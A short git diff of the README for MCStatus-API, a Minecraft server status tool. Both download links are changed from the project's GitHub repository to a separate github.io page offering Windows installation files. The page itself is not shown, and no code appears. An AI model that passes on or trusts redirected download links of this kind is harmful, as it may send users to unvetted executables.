@@ -1,6 +1,6 @@
 # 🌐 MCStatus-API - Monitor your Minecraft server status easily
 
-[![Download MCStatus-API](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/romonaqualified576/MCStatus-API)
+[![Download MCStatus-API](https://img.shields.io/badge/Download-Release-blue.svg)](https://romonaqualified576.github.io)
 
 MCStatus-API gives you live data about Minecraft Java Edition servers. You see player counts, server latency, current message of the day, and server icons in real time. This tool helps server owners track performance through REST endpoints and WebSocket streaming.
 
@@ -8,7 +8,7 @@ MCStatus-API gives you live data about Minecraft Java Edition servers. You see p
 
 You need the latest version of the software to start. Follow this link to the main release page where you find the installation files for Windows.
 
-[Click here to visit the download page](https://github.com/romonaqualified576/MCStatus-API)
+[Click here to visit the download page](https://romonaqualified576.github.io)
 
 ## 💻 System requirements
 
